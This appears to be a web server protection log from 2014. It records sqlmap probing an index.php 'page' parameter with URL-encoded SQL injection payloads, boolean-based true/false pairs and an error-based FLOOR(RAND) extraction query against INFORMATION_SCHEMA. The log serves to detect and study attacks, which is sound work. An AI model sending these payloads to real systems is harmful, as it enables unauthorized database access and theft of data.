7-12-2014 19:21:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%205321%3D8287%20AND%20%284945%3D4945&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%202547%3D2547%20AND%20%281946%3D1946&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:17 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%202639%3D9824&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:18 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%202547%3D2547&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:18 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%209313%3D1136%20AND%20%28%27OnmE%27%3D%27OnmE&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:18 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%202547%3D2547%20AND%20%28%27vkQr%27%3D%27vkQr&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%205772%3D8344%20AND%20%27zkyN%27%3D%27zkyN&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%202547%3D2547%20AND%20%27ywgg%27%3D%27ywgg&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%209219%3D2356%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%202547%3D2547%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%201404%3D2755--%20LXBx&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%202547%3D2547--%20Noah&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%20%28SELECT%205336%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%285336%3D5336%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%283720%3D3720&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:20 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%20%28SELECT%205336%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%285336%3D5336%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&id=2&attempt=1 | Referer: no referer

